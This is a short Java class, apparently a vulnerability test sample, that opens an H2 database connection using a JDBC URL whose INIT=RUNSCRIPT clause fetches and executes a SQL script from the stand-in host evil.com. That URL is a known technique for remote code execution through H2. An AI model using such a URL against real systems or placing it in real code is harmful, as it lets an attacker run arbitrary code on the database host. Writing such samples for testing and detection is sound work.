import java.sql.Connection;
import java.sql.DriverManager;

public class H2ConsoleVuln3 {
    public void loginDb() throws Exception {
        String maliciousUrl = "jdbc:h2:tcp://localhost/~/test;INIT=RUNSCRIPT FROM 'http://evil.com/payload.sql'";
        Connection conn = DriverManager.getConnection(maliciousUrl, "sa", "");
        conn.close();
    }
}
